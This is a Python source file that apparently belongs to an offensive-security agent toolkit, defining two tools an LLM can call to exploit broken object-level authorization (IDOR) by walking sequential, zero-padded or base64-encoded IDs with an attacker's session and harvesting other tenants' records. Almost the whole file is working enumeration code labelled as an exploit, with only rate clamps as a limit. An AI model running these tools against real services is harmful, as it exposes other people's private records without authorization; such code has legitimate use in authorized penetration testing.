"""TOOL: idor_ripper - broken object-level authorization exploited systematically.

Walks an ID space with the ATTACKER's session only. A hit = another tenant's
record returned 200 with body differing from the attacker's own record shape.
Supports sequential ints, zero-padded IDs, and base64(user_id) patterns from
the WAR_PLAN deep-link grammar.
"""
import base64, re

from tools import register
from tools._exploit_lib import paced_send, verdict
import time

@register(name="idor_enum",
          desc="EXPLOIT: IDOR/BOLA enumeration — attacker-session walk of an ID space with differential body confirmation. Returns every foreign record it can read.",
          params={"type": "object", "properties": {
              "url_template": {"type": "string", "description": "URL with {ID} placeholder"},
              "start": {"type": "integer", "default": 1},
              "stop": {"type": "integer", "default": 100},
              "step": {"type": "integer", "default": 1},
              "pad": {"type": "integer", "description": "zero-pad width, e.g. 4 -> 0007"},
              "attacker_header": {"type": "string", "description": "auth header for YOUR session, e.g. 'Authorization: Bearer ey...' or 'Cookie: sid=...'"},
              "own_id": {"type": "integer", "description": "your own record id (excluded from hits)"},
              "max_hits": {"type": "integer", "default": 25}},
              "required": ["url_template"]},
          danger="loud")
def idor_enum(url_template, start=1, stop=100, step=1, pad=None,
              attacker_header=None, own_id=None, max_hits=25):
    # ROE clamps: an LLM passing stop=10000000 must not become a 10M-request walk
    start = max(0, int(start or 0))
    stop = min(int(stop or 100), start + 20_000)
    step = max(1, min(int(step or 1), 1_000))
    max_hits = max(1, min(int(max_hits or 25), 200))
    if "{ID}" not in url_template:
        return verdict("idor_enum", False, "url_template lacks {ID} placeholder")
    headers = {}
    if attacker_header:
        k, _, v = attacker_header.partition(":")
        if v:
            headers = {k.strip(): v.strip()}
        else:
            headers = {"Authorization": f"Bearer {attacker_header.strip()}"}

    # fingerprint the attacker's OWN record first (shape reference)
    own_body = None
    if own_id is not None:
        _st, own_body, _dt = paced_send(url_template.replace("{ID}", str(own_id)), headers=headers)
        own_body = own_body or ""

    hits, checked = [], 0
    for i in range(start, stop + 1, max(1, step)):
        if own_id is not None and i == own_id:
            continue
        sid = str(i).zfill(pad) if pad else str(i)
        st, body, dt = paced_send(url_template.replace("{ID}", sid), headers=headers)
        checked += 1
        if st == 200 and body:
            differs = not own_body or _different(own_body, body)
            if differs:
                hits.append({"id": sid, "status": st, "size": len(body),
                             "sample": body[:300]})
                if len(hits) >= max_hits:
                    break
        elif st in (401, 403):
            pass  # properly protected id — continue
        time.sleep(0.08)

    exploitable = bool(hits)
    return verdict("idor_enum", exploitable,
                   (f"CONFIRMED BOLA: {len(hits)} foreign record(s) readable "
                    f"(checked {checked} ids)" if exploitable else
                    f"no foreign reads in {checked} ids — object auth likely enforced"),
                   evidence=[f"id={h['id']} size={h['size']}" for h in hits[:12]],
                   hits=hits)


def _different(own, other):
    """Differential: different length by >15% or different first data token."""
    if abs(len(own) - len(other)) > max(60, int(len(own) * 0.15)):
        return True
    a = re.sub(r"\s+", " ", own)[:400]
    b = re.sub(r"\s+", " ", other)[:400]
    return a[:200] != b[:200]

@register(name="idor_b64_walk",
          desc="EXPLOIT: base64(id) IDOR variant — for APIs using base64(user_id)-style identifiers (WAR_PLAN deep-link grammar). Encodes the range and walks it.",
          params={"type": "object", "properties": {
              "url_template": {"type": "string", "description": "URL with {ID} where the b64 token goes"},
              "start": {"type": "integer", "default": 1},
              "stop": {"type": "integer", "default": 50},
              "variant": {"type": "string", "enum": ["plain", "b64", "b64url"], "default": "b64"}},
              "required": ["url_template"]},
          danger="loud")
def idor_b64_walk(url_template, start=1, stop=50, variant="b64"):
    if "{ID}" not in url_template:
        return verdict("idor_b64_walk", False, "url_template lacks {ID} placeholder")
    hits, checked = [], 0
    for i in range(start, stop + 1):
        raw = str(i)
        if variant == "b64":
            tok = base64.b64encode(raw.encode()).decode()
        elif variant == "b64url":
            tok = base64.urlsafe_b64encode(raw.encode()).decode().rstrip("=")
        else:
            tok = raw
        st, body, _dt = paced_send(url_template.replace("{ID}", tok))
        checked += 1
        if st == 200 and body and not _is_error_page(body):
            hits.append({"id_raw": raw, "token": tok, "size": len(body),
                         "sample": body[:250]})
    return verdict("idor_b64_walk", bool(hits),
                   (f"{len(hits)} record(s) reachable via {variant} id walk ({checked} tried)"
                    if hits else f"no readable records across {checked} tokens"),
                   evidence=[h["token"] for h in hits[:10]], hits=hits)


def _is_error_page(body):
    low = body.lower()
    return any(m in low for m in ("not found", "unauthorized", "forbidden", "error", "login")) and len(body) < 900
